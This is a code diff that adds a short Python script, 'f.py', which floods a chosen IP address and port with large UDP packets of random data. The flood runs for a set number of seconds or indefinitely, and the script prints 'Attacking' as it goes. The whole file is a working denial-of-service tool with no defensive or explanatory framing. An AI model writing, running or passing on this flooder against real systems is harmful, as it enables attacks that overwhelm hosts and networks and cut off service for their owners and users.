@@ -1,0 +1,35 @@
+#!/usr/bin/python
+import socket, random, sys, time, select
+
+if len(sys.argv) < 3:
+    sys.exit("Usage: f.py ip port [length]")
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+duration = 0
+if len(sys.argv) >= 4:
+    duration = int(sys.argv[3])
+
+# Create a socket for the server
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# Generate random data to use in the attack
+bytes = random._urandom(65500)
+
+print(f"Attacking {ip}:{port} for {duration or 'infinite'} seconds")
+
+start_time = time.time()
+while True:
+    # Check if the duration has been exceeded
+    if duration and time.time() > start_time + duration:
+        break
+
+    # Send the data to the server
+    sock.sendto(bytes, (ip, port))
+
+    # Check if the user has pressed the 'q' key
+    if select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], []):
+        if sys.stdin.readline().strip() == "q":
+            break
+
+print("DONE")
